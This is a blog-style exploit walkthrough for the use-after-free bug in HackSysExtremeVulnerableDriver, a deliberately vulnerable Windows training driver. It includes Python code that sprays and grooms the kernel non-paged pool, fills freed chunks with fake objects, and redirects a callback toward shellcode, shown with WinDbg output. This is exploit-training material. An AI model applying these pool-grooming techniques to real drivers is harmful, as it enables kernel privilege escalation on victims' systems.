---
layout:     post
title:      HackSysExtremeVulnerableDriver Use After Free
author:     wooy0ung
tags:       hevd
category:   exploit
---

- 目录
{:toc #markdown-toc}

>[Analysis Environment]  
>guest machine: Windows 7 x86 sp0  
>host machine: Windows 10  
>necessary tools: VirtualKD[[here]](http://virtualkd.sysprogs.org/)、OSRloader[[here]](https://www.osronline.com/article.cfm?article=157)、HackSysExtremeVulnerableDriver[[here]](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)、Windbg  
<!-- more -->


## 0x001 Test method

In this challenge, we have more CTL method, including AllocateUaFObject、UseUaFObject、FreeUaFObject、AllocateFakeObject.

We’ll try each of them just to make sure they work perfectly！

AllocateUaFObject method
```
import sys
from ctypes import *

kernel32 = windll.kernel32
psapi = windll.Psapi
ntdll = windll.ntdll

hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)

if not hevDevice or hevDevice == -1:
   print "[-] Couldn't get Device Driver handle."
   sys.exit(0)

kernel32.DeviceIoControl(hevDevice, 0x222013, None, None, None, 0, byref(c_ulong()), None)
```

FreeUaFObject method
```
···
kernel32.DeviceIoControl(hevDevice, 0x22201B, None, None, None, 0, byref(c_ulong()), None)
···
```

AllocateFakeObject method
```
···
fake_obj = "\x41" * 0x60
kernel32.DeviceIoControl(hevDevice, 0x22201F, fake_obj, len(fake_obj), None, 0, byref(c_ulong()), None)
···
```

UseUaFObject method
```
···
kernel32.DeviceIoControl(hevDevice, 0x222017, None, None, None, 0, byref(c_ulong()), None)
···
```

Work fine!
```
****** HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT ******
[+] Allocating UaF Object
[+] Pool Tag: 'kcaH'
[+] Pool Type: NonPagedPool
[+] Pool Size: 0x58
[+] Pool Chunk: 0x87A5C2E8
[+] UseAfterFree Object: 0x87A5C2E8
[+] g_UseAfterFreeObject: 0x87A5C2E8
[+] UseAfterFree->Callback: 0x90D992A4
****** HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT ******

****** HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT ******
[+] Freeing UaF Object
[+] Pool Tag: 'kcaH'
[+] Pool Chunk: 0x87A5C2E8
****** HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT ******

****** HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT ******
[+] Creating Fake Object
[+] Pool Tag: 'kcaH'
[+] Pool Type: NonPagedPool
[+] Pool Size: 0x58
[+] Pool Chunk: 0x85969718
[+] Fake Object: 0x85969718
****** HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT ******

****** HACKSYS_EVD_IOCTL_USE_UAF_OBJECT ******
[+] Using UaF Object
[+] g_UseAfterFreeObject: 0x87A5C2E8
[+] g_UseAfterFreeObject->Callback: 0x00000000
[+] Calling Callback
****** HACKSYS_EVD_IOCTL_USE_UAF_OBJECT ******
```


## 0x002 Exploit it!

Look at AllocateUaFObject method, it will allocate a 0x60 size block.
![](/assets/img/exploit/2018-08-06-hacksys-extreme-vulnerable-driver-useafterfree/0x001.png)

We may using a huge amount of IoCompletionReserve objects to spray our non-paged pool.
```
import sys,struct
from ctypes import *
from subprocess import *

def main():
    kernel32 = windll.kernel32
    ntdll = windll.ntdll

    hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)

    if not hevDevice or hevDevice == -1:
       print "[-] Couldn't get Device Driver handle."
       sys.exit(0)

    spray_event1 = spray_event2 = []

    for i in xrange(10000):
        spray_event1.append(ntdll.NtAllocateReserveObject(byref(HANDLE(0)), 0, 1))
 
    for i in xrange(5000):
        spray_event2.append(ntdll.NtAllocateReserveObject(byref(HANDLE(0)), 0, 1))

    # allocate
    kernel32.DeviceIoControl(hevDevice, 0x222013, None, None, None, 0, byref(c_ulong()), None)

if __name__ == "__main__":
    main()
```

Ignore the "Hack" block, it may be placed in a wrong place, becase I debug it too many times without reboot my system, some 0x60 size block still leave in there.
```
****** HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT ******
[+] Allocating UaF Object
[+] Pool Tag: 'kcaH'
[+] Pool Type: NonPagedPool
[+] Pool Size: 0x58
[+] Pool Chunk: 0x85BDFD68
[+] UseAfterFree Object: 0x85BDFD68
[+] g_UseAfterFreeObject: 0x85BDFD68
[+] UseAfterFree->Callback: 0x90D992A4
Breakpoint 0 hit
HEVD!AllocateUaFObject+0xf4:
90d993aa 8bc7            mov     eax,edi
kd> !pool 0x85BDFD68
Pool page 85bdfd68 region is Nonpaged pool
 85bdf000 size:   60 previous size:    0  (Allocated)  IoCo (Protected)
 85bdf060 size:  d00 previous size:   60  (Free)       ....
*85bdfd60 size:   60 previous size:  d00  (Allocated) *Hack
		Owning component : Unknown (update pooltag.txt)
 85bdfdc0 size:   60 previous size:   60  (Allocated)  IoCo (Protected)
 85bdfe20 size:   60 previous size:   60  (Allocated)  IoCo (Protected)
 85bdfe80 size:   60 previous size:   60  (Allocated)  IoCo (Protected)
 85bdfee0 size:   60 previous size:   60  (Allocated)  IoCo (Protected)
 85bdff40 size:   60 previous size:   60  (Allocated)  IoCo (Protected)
 85bdffa0 size:   60 previous size:   60  (Allocated)  IoCo (Protected)
```

In order to prevent coalescence, we shoud reserve a allocated block between two freed blocks!
```
import sys,struct
from ctypes import *
from subprocess import *

def main():
    kernel32 = windll.kernel32
    ntdll = windll.ntdll

    hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)

    if not hevDevice or hevDevice == -1:
       print "[-] Couldn't get Device Driver handle."
       sys.exit(0)

    spray_event1 = spray_event2 = []

    for i in xrange(10000):
        spray_event1.append(ntdll.NtAllocateReserveObject(byref(HANDLE(0)), 0, 1))
 
    for i in xrange(5000):
        spray_event2.append(ntdll.NtAllocateReserveObject(byref(HANDLE(0)), 0, 1))

    for i in xrange(0, len(spray_event2), 2):
        kernel32.CloseHandle(spray_event2[i])

    # allocate
    kernel32.DeviceIoControl(hevDevice, 0x222013, None, None, None, 0, byref(c_ulong()), None)

if __name__ == "__main__":
    main()
```

We created numbers of holes for our exploit to dig in.
```
Pool page 859c0ee8 region is Nonpaged pool
 859c0000 size:   60 previous size:    0  (Allocated)  IoCo (Protected)
 859c0060 size:  e80 previous size:   60  (Free)       v.\.
*859c0ee0 size:   60 previous size:  e80  (Allocated) *Hack
		Owning component : Unknown (update pooltag.txt)
 859c0f40 size:   60 previous size:   60  (Allocated)  IoCo (Protected)
 859c0fa0 size:   60 previous size:   60  (Allocated)  IoCo (Protected)
```

Now, I allocate fake objects with the same junk
```
import sys,struct
from ctypes import *
from subprocess import *

def main():
    kernel32 = windll.kernel32
    ntdll = windll.ntdll

    hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)

    if not hevDevice or hevDevice == -1:
       print "[-] Couldn't get Device Driver handle."
       sys.exit(0)

    spray_event1 = spray_event2 = []

    for i in xrange(10000):
        spray_event1.append(ntdll.NtAllocateReserveObject(byref(HANDLE(0)), 0, 1))
 
    for i in xrange(5000):
        spray_event2.append(ntdll.NtAllocateReserveObject(byref(HANDLE(0)), 0, 1))

    for i in xrange(0, len(spray_event2), 2):
        kernel32.CloseHandle(spray_event2[i])

    # allocate
    kernel32.DeviceIoControl(hevDevice, 0x222013, None, None, None, 0, byref(c_ulong()), None)

    # free
    kernel32.DeviceIoControl(hevDevice, 0x22201B, None, None, None, 0, byref(c_ulong()), None)

    # allocate fake
    fake_obj = "\x41" * 0x60
    for i in xrange(5000):
        kernel32.DeviceIoControl(hevDevice, 0x22201F, fake_obj, len(fake_obj), None, 0, byref(c_ulong()), None)

if __name__ == "__main__":
    main()
```

The "Hack" block sprayed upto junk data after the pool header
```
****** HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT ******
[+] Creating Fake Object
[+] Pool Tag: 'kcaH'
[+] Pool Type: NonPagedPool
[+] Pool Size: 0x58
[+] Pool Chunk: 0x85A45FA8
[+] Fake Object: 0x85A45FA8
Breakpoint 1 hit
HEVD!AllocateFakeObject+0xd4:
a4bfb5cc 8b45e4          mov     eax,dword ptr [ebp-1Ch]
kd> !pool 0x85A45FA8
Pool page 85a45fa8 region is Nonpaged pool
 85a45000 size:   60 previous size:    0  (Allocated)  IoCo (Protected)
 85a45060 size:  f40 previous size:   60  (Free)       A.\.
*85a45fa0 size:   60 previous size:  f40  (Allocated) *Hack
		Owning component : Unknown (update pooltag.txt)
kd> dd 85a45fa0
85a45fa0  040c01e8 6b636148 41414141 41414141
85a45fb0  41414141 41414141 41414141 41414141
85a45fc0  41414141 41414141 41414141 41414141
85a45fd0  41414141 41414141 41414141 41414141
85a45fe0  41414141 41414141 41414141 41414141
85a45ff0  41414141 41414141 41414141 00414141
85a46000  00660070 00000000 c0120070 00000000
85a46010  0000077c 00000384 1a429d6e 00000000
```

If we use shellcode Addr instaed of the junk, the Callback Addr will point to our shellcode
![](/assets/img/exploit/2018-08-06-hacksys-extreme-vulnerable-driver-useafterfree/0x002.png)

pwn~
![](/assets/img/exploit/2018-08-06-hacksys-extreme-vulnerable-driver-useafterfree/0x003.png)